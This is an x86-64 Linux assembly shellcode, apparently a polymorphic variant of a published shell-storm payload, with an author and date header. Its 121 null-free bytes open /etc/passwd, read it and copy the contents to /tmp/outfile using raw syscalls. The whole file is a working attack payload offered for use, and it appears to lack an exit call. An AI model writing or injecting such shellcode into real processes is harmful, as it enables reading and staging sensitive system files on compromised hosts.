;Author: Javier Tejedor (Polimorphic version of Chris Higgins <chris@chigs.me> : http://shell-storm.org/shellcode/files/shellcode-867.php)
;Copy /etc/passwd to /tmp/outfile
;Length: 121 | NOT NULLS
;Date 19/10/2014

global _start

section .text

_start:
	push 0x2
	pop rax
        xor rdi, rdi
	push rdi
        mov rbx, 0x6477737361702F2F
        push rbx
	mov rbx, 0x2f2f2f2f6374652f
	push rbx			;/etc//////passwd on stack
	mov rsi, rdi
        lea rdi, [rsp]
        syscall				;syscall __NR_open
        mov rbx, rax
        xor rax, rax
        mov rdi, rbx
        mov rsi, rsp
	xor rdx, rdx
	mov dx, 0xffff			;permissions
        syscall				;syscall __NR_read
        mov r8, rax
        mov rax, rsp
        xor rbx, rbx
	mov rsi, rbx
        push rbx
        mov ebx, 0x656c6966
        push rbx
        mov rbx, 0x74756f2f706d742f
        push rbx			;/tmp/outfile on stack
        mov rbx, rax
	push 0x2
	pop rax
        lea rdi, [rsp]
        push 0x66
        pop rsi
        syscall				;syscall __NR_open
        mov rdi, rax			;gets the content
	push 0x1
	pop rax
        lea rsi, [rbx]			;passwd file content
        xor rdx, rdx
        mov rdx, r8
        syscall				;syscall __NR_write
